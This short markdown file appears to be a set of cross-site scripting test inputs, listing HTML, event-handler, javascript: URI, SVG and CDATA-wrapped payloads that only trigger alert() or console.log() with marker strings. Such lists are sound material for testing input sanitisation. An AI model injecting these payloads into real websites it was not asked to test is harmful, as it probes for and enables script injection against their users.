# XSS Testing

```html
<!-- HTML Tag -->
<b>XSS_TEST_BOLD</b>

<!-- HTML Attribute -->
<img src="x" onerror="console.log('XSS_IMG_ERROR')" />
<img src=invalid onerror=alert('XSS_IMG_ONERROR')>

<!-- JavaScript -->
<script>
  alert('XSS_SCRIPT')
</script>
<script>
  console.log('XSS_SCRIPT_LOG')
</script>

<!-- JavaScript Event -->
<div onmouseover="alert('XSS_ONMOUSEOVER')">hover me</div>
<input autofocus onfocus="console.log('XSS_ONFOCUS')" />

<!-- JavaScript URI -->
<a href="javascript:alert('XSS_JSURI')">click</a>

<!-- SVG -->
<svg onload="console.log('XSS_SVG_ONLOAD')"></svg>

<!-- XML -->
<note
  ><body>
    <![CDATA[<div>XML payload:
    <b>XML_TEST_BOLD</b><script>console.log('XML_SCRIPT');</script></div>]]>
  </body></note
>

<root><![CDATA[<svg onload="console.log('XSS_SVG_ONLOAD')"></svg>]]></root>

<item><![CDATA[<a href="javascript:alert('XSS_JSURI')">click</a>]]></item>
```
